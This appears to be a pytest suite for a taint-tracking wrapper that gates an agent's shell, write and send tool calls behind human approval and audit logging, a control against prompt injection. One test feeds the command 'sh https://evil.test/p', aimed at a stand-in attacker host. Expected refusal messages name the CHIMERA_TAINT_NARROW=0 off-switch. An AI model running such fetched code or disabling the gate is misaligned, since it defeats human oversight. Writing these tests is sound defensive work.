"""`LedgeredTool`, by what it writes down and what it asks — the mutation gate's findings (S30-37).

`ledger_tool.py` is the wrapper every governed tool call passes through. When it entered the mutation
gate, 159 of its mutants survived: the tests saw THAT a call was refused or asked, not the audit line
it left (its type and keys — what the Security screen reads), not the assessment it handed the
approver, not what it recorded in the ledger after a write, a read or a send, and not the two
defaults that decide whether a surface narrows and whether it asks about an unseen recipient.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from chimera.governance.audit import AuditLog
from chimera.governance.exec_facts import annotate, facts_for
from chimera.governance.ledger import SequenceAssessment, TaintLedger, describe_call, proposal_of
from chimera.governance.ledger_tool import LedgeredTool, ledger_registry
from chimera.governance.policy import Decision
from chimera.tools.base import Tool, is_refusal
from chimera.tools.registry import ToolRegistry


class _Fake(Tool):
    def __init__(self, name: str, answer: str = "done") -> None:
        self.name = name
        self.description = f"the {name} tool"
        self.parameters = {"type": "object", "properties": {"x": {"type": "string"}}}
        self.answer = answer
        self.calls: list[dict[str, Any]] = []

    def run(self, **kwargs: Any) -> str:
        self.calls.append(kwargs)
        return self.answer


class _Approver:
    def __init__(self, answer: bool) -> None:
        self.answer = answer
        self.asked: list[SequenceAssessment] = []

    def __call__(self, assessment: SequenceAssessment) -> bool:
        self.asked.append(assessment)
        return self.answer


def _audit(tmp_path: Path) -> AuditLog:
    return AuditLog(tmp_path / "audit.jsonl")


def _lines(audit: AuditLog) -> list[tuple[str, dict[str, Any]]]:
    keep = ("seq", "type", "prev", "hash")
    return [(e["type"], {k: v for k, v in e.items() if k not in keep}) for e in audit.entries()]


def _tainted(*sources: str) -> TaintLedger:
    ledger = TaintLedger()
    ledger.set_instruction("do the task")
    for src in sources or ("https://evil.test/p",):
        ledger.record_fetch(src, content="page " + src, requested_by="agent")
    return ledger


# --- defaults and wiring --------------------------------------------------------------------------


def test_the_wrapper_shows_the_inner_tools_name_description_and_parameters() -> None:
    inner = _Fake("read_file")
    tool = LedgeredTool(inner, TaintLedger())
    assert (tool.name, tool.description, tool.parameters) == (
        inner.name, inner.description, inner.parameters
    )


def test_by_default_a_send_to_an_unseen_address_goes_ahead_and_is_only_recorded(tmp_path: Path) -> None:
    inner, audit, approve = _Fake("send_email"), _audit(tmp_path), _Approver(False)
    tool = LedgeredTool(inner, _tainted(), approve=approve, audit=audit)
    assert tool.run(to="nobody@x.test", body="hi") == "done"
    assert approve.asked == []
    assert ("recipient_unseen", {"tool": "send_email", "recipients": ["nobody@x.test"], "card": False}) \
        in _lines(audit)


def test_a_registry_built_without_flags_neither_narrows_nor_asks(tmp_path: Path) -> None:
    registry = ToolRegistry()
    registry.register(_Fake("run_shell"))
    registry.register(_Fake("send_email"))
    approve = _Approver(False)
    wrapped = ledger_registry(registry, _tainted(), approve=approve)
    assert wrapped.get("run_shell").run(command="ls") == "done"
    assert wrapped.get("send_email").run(to="nobody@x.test") == "done"
    assert approve.asked == []


def test_a_registry_built_to_ask_about_recipients_asks(tmp_path: Path) -> None:
    registry = ToolRegistry()
    registry.register(_Fake("send_email"))
    approve = _Approver(False)
    wrapped = ledger_registry(registry, _tainted(), approve=approve, ask_unseen_recipients=True)
    assert is_refusal(wrapped.get("send_email").run(to="nobody@x.test"))
    assert len(approve.asked) == 1


# --- narrowing ------------------------------------------------------------------------------------


def test_narrowing_audits_and_asks_with_the_full_assessment(tmp_path: Path) -> None:
    ledger = _tainted("https://a.test/1", "https://a.test/2", "https://a.test/3", "https://a.test/4")
    inner, audit, approve = _Fake("run_shell"), _audit(tmp_path), _Approver(False)
    tool = LedgeredTool(inner, ledger, approve=approve, audit=audit, narrow_on_taint=True)
    out = tool.run(command="make deploy")
    assert is_refusal(out) and inner.calls == []
    sources = ledger.taint_sources(for_narrowing=True)
    reason = (
        "run_shell is restricted after this run consumed untrusted content from "
        "https://a.test/1 (fetched by the agent); https://a.test/2 (fetched by the agent); "
        "https://a.test/3 (fetched by the agent)"
    )
    # The card is the call plus what it resolves to on this machine (S30-30): `make` exists on a
    # Linux runner and not on every Windows one, so the facts are built here by the same function
    # the tool uses, from the same arguments, and the whole assessment is still compared exactly.
    programs = facts_for("run_shell", {"command": "make deploy"}, inner)
    action = annotate(describe_call("run_shell", {"command": "make deploy"}, "make deploy"), programs)
    assert approve.asked == [SequenceAssessment(
        True, Decision.REVIEW, reason, action=action, sources=sources,
        proposal=proposal_of("run_shell", {"command": "make deploy"}, ledger.taint_epoch),
        programs=programs,
    )]
    assert _lines(audit) == [
        ("taint_narrowed", {"tool": "run_shell", "reason": reason, "action": action, "sources": sources})
    ]
    assert f"[taint: needs review — {reason}]" in out and "Nobody approved it." in out


def test_a_refusal_with_nobody_to_ask_says_how_through() -> None:
    tool = LedgeredTool(_Fake("run_shell"), _tainted(), narrow_on_taint=True)
    out = tool.run(command="make deploy")
    assert is_refusal(out)
    assert "Nobody approved it." not in out and "CHIMERA_TAINT_NARROW=0" in out


@pytest.mark.parametrize(
    ("name", "args", "target"),
    [
        ("run_shell", {"command": "ls", "path": "p"}, "ls"),
        ("write_file", {"path": "p.txt", "url": "https://u.test/"}, "p.txt"),
        ("http_post", {"url": "https://u.test/", "to": "a@x.test"}, "https://u.test/"),
        ("send_email", {"to": "a@x.test"}, "a@x.test"),
        ("send_message", {"recipient": "bob"}, "bob"),
        ("send_message", {"channel": "#ops"}, "#ops"),
        ("send_message", {"chat_id": "42"}, "42"),
    ],
)
def test_the_narrowed_action_names_the_most_specific_target(
    name: str, args: dict[str, str], target: str
) -> None:
    approve = _Approver(False)
    LedgeredTool(_Fake(name), _tainted(), approve=approve, narrow_on_taint=True).run(**args)
    assert approve.asked[0].action.splitlines()[0] == f"{name}: {target}"


def test_an_approved_narrowing_is_not_asked_again_about_the_recipient(tmp_path: Path) -> None:
    inner, audit, approve = _Fake("send_email"), _audit(tmp_path), _Approver(True)
    tool = LedgeredTool(inner, _tainted(), approve=approve, audit=audit, narrow_on_taint=True,
                        ask_unseen_recipient=True)
    assert tool.run(to="nobody@x.test") == "done"
    assert len(approve.asked) == 1  # one card for the call, not a second one for the address
    assert approve.asked[0].reason.endswith(
        "; the recipient nobody@x.test never appeared in the conversation or in anything this run read"
    )
    assert ("recipient_unseen", {"tool": "send_email", "recipients": ["nobody@x.test"], "card": True}) \
        in _lines(audit)


def test_a_watched_workspace_write_warns_instead_of_asking(tmp_path: Path) -> None:
    ledger = _tainted("https://a.test/1", "https://a.test/2", "https://a.test/3", "https://a.test/4")
    notes: list[tuple[str, str, dict[str, Any]]] = []
    inner, audit = _Fake("write_file"), _audit(tmp_path)
    tool = LedgeredTool(inner, ledger, audit=audit, narrow_on_taint=True, warn_workspace_writes=True,
                        notify=lambda *a: notes.append(a))
    long_path = "d/" + "p" * 400 + ".txt"
    assert tool.run(path=long_path, content="hello") == "done"
    sources = ledger.taint_sources(for_narrowing=True)
    from chimera.governance.ledger import _excerpt

    assert _lines(audit)[0] == (
        "taint_write_warned", {"tool": "write_file", "path": _excerpt(long_path, 300), "sources": sources}
    )
    assert notes == [(
        "tainted_write",
        "write_file ran after this turn read untrusted content from "
        "https://a.test/1 (fetched by the agent); https://a.test/2 (fetched by the agent); "
        "https://a.test/3 (fetched by the agent)",
        {"tool": "write_file", "path": _excerpt(long_path, 300), "sources": sources[:3]},
    )]


def test_a_watched_write_with_no_named_source_says_so_plainly() -> None:
    from chimera.governance.ledger import SharedTaint

    shared = SharedTaint()
    shared.publish_tainted()
    ledger = TaintLedger(shared=shared, authority="authority")
    ledger.record_fetch("https://a.test/", content="x", requested_by="user")
    notes: list[tuple[str, str, dict[str, Any]]] = []
    tool = LedgeredTool(_Fake("write_file"), ledger, narrow_on_taint=True,
                        warn_workspace_writes=True, notify=lambda *a: notes.append(a))
    tool.run(path="a.txt", content="x")
    assert notes[0][1] == (
        "write_file ran after this turn read untrusted content from "
        "a sibling worker's untrusted read (shared view)"
    )


# --- the sequence escalation ----------------------------------------------------------------------


def test_an_escalation_is_recorded_audited_and_handed_to_the_approver(tmp_path: Path) -> None:
    ledger = _tainted()
    inner, audit, approve = _Fake("run_shell"), _audit(tmp_path), _Approver(False)
    tool = LedgeredTool(inner, ledger, approve=approve, audit=audit)
    out = tool.run(command="sh https://evil.test/p")
    assert is_refusal(out) and inner.calls == []
    assessment = approve.asked[0]
    assert assessment.escalate and assessment.decision is Decision.REVIEW
    assert ledger.events[-1].kind == "escalation" and ledger.events[-1].ref == "run_shell"
    assert _lines(audit) == [("taint_review", {
        "tool": "run_shell", "decision": "review", "reason": assessment.reason,
        "tainted_refs": ["https://evil.test/p"],
    })]


# --- the unseen-recipient card --------------------------------------------------------------------


def test_the_recipient_card_shows_the_call_and_keys_on_the_whole_proposal(tmp_path: Path) -> None:
    ledger = TaintLedger()
    ledger.set_instruction("send the report")
    inner, audit, approve = _Fake("send_email"), _audit(tmp_path), _Approver(False)
    tool = LedgeredTool(inner, ledger, approve=approve, audit=audit, ask_unseen_recipient=True)
    out = tool.run(to=["x@a.test", "y@b.test"], body="the report")
    reason = ("send_email to x@a.test, y@b.test: this address never appeared in the conversation or "
              "in anything this run read")
    call = {"to": ["x@a.test", "y@b.test"], "body": "the report"}
    assert approve.asked == [SequenceAssessment(
        True, Decision.REVIEW, reason,
        action=describe_call("send_email", call, "x@a.test, y@b.test"),
        proposal=proposal_of("send_email", call, ledger.taint_epoch),
    )]
    assert approve.asked[0].action == (
        'send_email: x@a.test, y@b.test\n  to: ["x@a.test", "y@b.test"]\n  body: the report'
    )
    assert is_refusal(out) and out.endswith(f"[recipient: needs review — {reason}] The tool did NOT run. "
                   "Do not report this as done.")
    assert _lines(audit) == [("recipient_unseen", {
        "tool": "send_email", "recipients": ["x@a.test", "y@b.test"], "card": True,
    })]
    approve.answer = True
    assert tool.run(to=["x@a.test", "y@b.test"], body="the report") == "done"


# --- idempotency ----------------------------------------------------------------------------------


def test_a_repeated_send_is_skipped_and_audited_whatever_the_argument_order(tmp_path: Path) -> None:
    ledger = TaintLedger()
    ledger.note_seen("a@x.test")
    inner, audit = _Fake("send_email"), _audit(tmp_path)
    tool = LedgeredTool(inner, ledger, audit=audit)
    assert tool.run(to="a@x.test", body="hi") == "done"
    assert tool.run(body="hi", to="a@x.test") == (
        "[idempotent: send_email already executed with these args; not repeated]"
    )
    assert len(inner.calls) == 1
    assert _lines(audit) == [("idempotent_skip", {"tool": "send_email"})]


def test_idempotency_keys_on_the_tool_and_on_arguments_json_cannot_sort() -> None:
    ledger = TaintLedger()
    ledger.note_seen("a@x.test")
    email, message = _Fake("send_email"), _Fake("send_message")
    LedgeredTool(email, ledger).run(to="a@x.test")
    LedgeredTool(message, ledger).run(to="a@x.test")
    assert len(email.calls) == len(message.calls) == 1
    post = _Fake("http_post")
    tool = LedgeredTool(post, ledger)
    tool.run(url="https://u.test/", data={1: "a", "b": 2})  # mixed keys: sort_keys raises
    tool.run(url="https://u.test/", data={1: "c", "b": 2})
    assert len(post.calls) == 2


# --- what the ledger records after the call --------------------------------------------------------


def test_a_write_a_read_and_a_send_are_recorded_with_their_targets() -> None:
    ledger = TaintLedger()
    ledger.record_fetch("https://evil.test/p", content="a page body that is certainly long enough to flow")
    ledger.note_seen("a@x.test")
    LedgeredTool(_Fake("write_file"), ledger).run(
        path="out.txt", content="a page body that is certainly long enough to flow")
    LedgeredTool(_Fake("read_file"), ledger).run(path="out.txt")
    LedgeredTool(_Fake("send_message"), ledger).run(channel="#ops", text="hi")
    LedgeredTool(_Fake("http_post"), ledger).run(url="https://u.test/", data="x")
    write, read, send, post = ledger.events[-4:]
    assert (write.kind, write.ref, write.tainted) == ("write", "out.txt", True)
    assert (read.kind, read.ref, read.tainted) == ("read", "out.txt", True)
    assert (send.kind, send.ref) == ("send", "#ops")
    assert (post.kind, post.ref) == ("send", "https://u.test/")
    for key in ("to", "recipient", "chat_id"):
        LedgeredTool(_Fake("send_message"), ledger).run(**{key: f"v-{key}"})
        assert ledger.events[-1].ref == f"v-{key}"


def test_every_unseen_address_in_a_list_is_named() -> None:
    ledger = TaintLedger()
    ledger.set_instruction("send it")
    approve = _Approver(False)
    LedgeredTool(_Fake("send_email"), ledger, approve=approve, ask_unseen_recipient=True).run(
        to=["x@a.test"], cc=["y@b.test", "z@c.test"])
    assert approve.asked[0].reason.startswith("send_email to x@a.test, y@b.test, z@c.test:")


def test_two_unseen_recipients_are_listed_in_the_narrowing_reason() -> None:
    approve = _Approver(False)
    LedgeredTool(_Fake("send_email"), _tainted(), approve=approve, narrow_on_taint=True).run(
        to=["x@a.test", "y@b.test"])
    assert approve.asked[0].reason.endswith(
        "; the recipient x@a.test, y@b.test never appeared in the conversation or in anything this "
        "run read"
    )


def _tainted_without_a_named_source() -> TaintLedger:
    """Tainted, but by nothing `taint_sources` names: the user's own fetch is overlooked in
    authority mode, and what remains tainted is a write that carried it."""
    ledger = TaintLedger(authority="authority")
    page = "a page the user asked for, long enough to be recognised in a write"
    ledger.record_fetch("https://a.test/", content=page, requested_by="user")
    ledger.record_write("copy.txt", content=page)
    assert ledger.run_tainted(for_narrowing=True) and ledger.taint_sources(for_narrowing=True) == []
    return ledger


def test_a_narrowing_with_no_named_source_says_only_what_it_restricts() -> None:
    approve = _Approver(False)
    LedgeredTool(_Fake("run_shell"), _tainted_without_a_named_source(), approve=approve,
                 narrow_on_taint=True).run(command="ls")
    assert approve.asked[0].reason == "run_shell is restricted after this run consumed untrusted content"


def test_a_watched_write_with_no_source_at_all_names_none() -> None:
    notes: list[tuple[str, str, dict[str, Any]]] = []
    LedgeredTool(_Fake("write_file"), _tainted_without_a_named_source(), narrow_on_taint=True,
                 warn_workspace_writes=True, notify=lambda *a: notes.append(a)).run(path="b.txt", content="x")
    assert notes[0][1] == "write_file ran after this turn read untrusted content"


def test_through_the_deferred_proxy_two_tools_with_the_same_arguments_both_run() -> None:
    # One wrapper sees many inner tools through `tool_call`; the idempotency key must include which.
    from chimera.governance.proxy import DEFERRED_PROXY

    ledger = TaintLedger()
    ledger.note_seen("a@x.test")
    proxy = _Fake(DEFERRED_PROXY)
    tool = LedgeredTool(proxy, ledger)
    tool.run(tool="send_email", arguments={"to": "a@x.test"})
    tool.run(tool="send_message", arguments={"to": "a@x.test"})
    assert len(proxy.calls) == 2


def test_a_send_with_no_target_is_recorded_under_the_tool_name() -> None:
    ledger = TaintLedger()
    LedgeredTool(_Fake("create_issue"), ledger).run(title="t")
    assert (ledger.events[-1].kind, ledger.events[-1].ref) == ("send", "create_issue")


def test_no_send_tool_is_also_one_the_sequence_check_assesses() -> None:
    # Step 1 of `LedgeredTool.run` marks `asked` so the unseen-recipient check does not show a second
    # card — but only a send has recipients, and step 1 only ever escalates an exec, a write or a
    # fetch. While the two families are disjoint that `asked = True` cannot change anything, and the
    # mutation allowlist says so. A tool added to both makes it live: then this fails, and the test
    # to write is the step-1 twin of `test_an_approved_narrowing_is_not_asked_again_about_the_recipient`.
    from chimera.governance.ledger import EXEC_TOOLS, FETCH_TOOLS, WRITE_TOOLS
    from chimera.governance.ledger_tool import SIDE_EFFECT_TOOLS, sends_to_someone

    assessed = EXEC_TOOLS | WRITE_TOOLS | FETCH_TOOLS
    assert not [tool for tool in assessed if sends_to_someone(tool)]
    assert not SIDE_EFFECT_TOOLS & assessed


def test_a_repeated_send_is_the_same_call_whatever_order_its_nested_fields_came_in() -> None:
    # Same tool, same arguments: a dict nested in an argument that arrives in another key order, or
    # a value JSON has no type for (a path), is still the same call and must not be sent twice.
    ledger = TaintLedger()
    post = _Fake("http_post")
    tool = LedgeredTool(post, ledger)
    tool.run(url="https://u.test/", data={"a": 1, "b": Path("x")})
    tool.run(url="https://u.test/", data={"b": Path("x"), "a": 1})
    assert len(post.calls) == 1
